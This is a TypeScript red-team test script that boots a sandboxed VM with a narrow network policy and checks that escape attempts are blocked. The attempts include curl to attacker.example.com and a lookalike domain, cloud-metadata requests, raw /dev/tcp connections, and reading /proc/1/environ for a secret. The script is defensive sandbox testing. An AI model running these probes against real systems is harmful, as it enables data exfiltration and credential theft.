/**
 * The red team, against a real machine.
 *
 * The pure suite (tests/vm-redteam.test.ts) asserts what the policy decides;
 * this asserts what the network actually does, because the boundary is half
 * ours and half the substrate's and only one of those halves can be unit
 * tested. It boots a machine with a deliberately narrow policy and tries to get
 * out of it.
 *
 *   pnpm --filter @visvine/web exec tsx scripts/vm-redteam.ts
 *
 * Nightly rather than per-PR: it costs machine-minutes and it talks to the
 * internet. Skips loudly rather than passing quietly when there is no edge.
 */
import 'dotenv/config';
import { environment } from '../lib/vm/lease';

const ENV = environment();
const SPACE = process.env.REDTEAM_SPACE ?? 'community:blackbird-ventures';
const AGENT = 'redteam';
const edge = process.env.AGENT_EDGE_URL;
const secret = process.env.EDGE_SERVICE_TOKEN;

if (!edge || !secret) {
  console.log('SKIPPED: no agent edge configured (AGENT_EDGE_URL, EDGE_SERVICE_TOKEN).');
  process.exit(0);
}

async function call(path: string, body: unknown) {
  const res = await fetch(`${edge}${path}`, {
    method: 'POST',
    headers: { authorization: `Bearer ${secret}`, 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  return res.json() as Promise<Record<string, unknown>>;
}

async function inMachine(cmd: string[], timeoutSeconds = 25) {
  return call('/exec', { environment: ENV, spaceId: SPACE, agentName: AGENT, cmd, timeoutSeconds }) as Promise<{
    exitCode: number; stdout: string; stderr: string; timedOut: boolean;
  }>;
}

const results: { name: string; ok: boolean; detail: string }[] = [];

/**
 * A way out is closed when the command FAILS.
 *
 * `curl -f` matters more than it looks: without it curl exits 0 on a 403, so a
 * request our own handler REFUSED reads as a success and the suite passes while
 * reporting the opposite. Every HTTP probe here asks curl to treat a refusal as
 * a failure, which is what makes a green line mean anything.
 */
async function refuses(name: string, cmd: string[], timeoutSeconds = 25) {
  const out = await inMachine(cmd, timeoutSeconds);
  const ok = out.exitCode !== 0 || out.timedOut;
  results.push({
    name,
    ok,
    detail: ok ? `blocked (exit ${out.exitCode}${out.timedOut ? ', timed out' : ''})` : `REACHED: ${out.stdout.trim().slice(0, 120)}`,
  });
}

async function allows(name: string, cmd: string[]) {
  const out = await inMachine(cmd);
  const ok = out.exitCode === 0;
  results.push({ name, ok, detail: ok ? 'reachable, as intended' : `blocked unexpectedly: ${out.stderr.trim().slice(0, 120)}` });
}

async function main() {
  // Narrow on purpose: one allowed host, one credential bound to it.
  const policy = {
    version: 1,
    allow: ['example.com'],
    deny: ['localhost'],
    approval: [],
    inject: [{ host: 'example.com', header: 'X-Redteam', secret: 'REDTEAM_SECRET' }],
  };
  await call('/stop', { environment: ENV, spaceId: SPACE, agentName: AGENT });
  console.log('lease:', JSON.stringify(await call('/lease', {
    environment: ENV, spaceId: SPACE, agentName: AGENT, policy, instanceType: 'standard-3',
    workspaceKey: `spaces/${ENV}/${SPACE}/workspace`, idleMinutes: 10,
  })));

  // Exercises the injection path too: the header is attached at the edge, so a
  // 200 here means the credential was added to a request the machine made
  // without ever holding it.
  await allows('an allowed host is reachable, with its credential attached at the edge', [
    'curl', '-fsS', '-m', '15', '-o', '/dev/null', 'https://example.com/',
  ]);
  await refuses('an unlisted host', ['curl', '-fsS', '-m', '12', '-o', '/dev/null', 'https://attacker.example.com/']);
  await refuses('a lookalike of an allowed host', ['curl', '-fsS', '-m', '12', '-o', '/dev/null', 'https://example.com.evil.example.net/']);
  await refuses('the allowed host by address', ['curl', '-fsS', '-m', '12', '-o', '/dev/null', 'https://93.184.216.34/']);
  await refuses('cloud metadata', ['curl', '-fsS', '-m', '10', '-o', '/dev/null', 'http://169.254.169.254/latest/meta-data/']);
  await refuses('plain HTTP to an allowed host', ['sh', '-c', 'curl -fsS -m 10 -o /dev/null http://example.com/ && echo REACHED']);
  await refuses('raw TCP on a non-web port', ['sh', '-c', 'timeout 8 bash -c "cat < /dev/tcp/example.com/22" && echo REACHED']);
  // Resolution itself is not exfiltration, and it succeeds — the platform's
  // resolver answers, with a sinkhole address for anything the policy does not
  // allow. What must not work is REACHING what it resolved to.
  await refuses('what a resolved but unlisted host resolves to', [
    'sh', '-c',
    'ip=$(getent hosts attacker.example.com | head -1 | cut -d" " -f1); ' +
    '[ -n "$ip" ] && timeout 8 bash -c "cat < /dev/tcp/$ip/443" && echo REACHED',
  ]);

  // The credential is injected outside the container; nothing inside may read it.
  const env = await inMachine([
    'sh', '-c',
    'env | grep REDTEAM_SECRET || true; cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep REDTEAM_SECRET || true',
  ]);
  results.push({
    name: 'the injected credential is not inside the machine',
    ok: !env.stdout.includes('REDTEAM_SECRET'),
    detail: env.stdout.trim() ? `FOUND: ${env.stdout.trim().slice(0, 120)}` : 'not present anywhere in the machine',
  });

  await call('/stop', { environment: ENV, spaceId: SPACE, agentName: AGENT });

  console.log('');
  for (const r of results) console.log(`${r.ok ? 'PASS' : 'FAIL'}  ${r.name} — ${r.detail}`);
  const failed = results.filter((r) => !r.ok);
  console.log(`\n${results.length - failed.length}/${results.length} held`);
  if (failed.length > 0) process.exitCode = 1;
}

main().catch((e) => { console.error(e); process.exitCode = 1; });
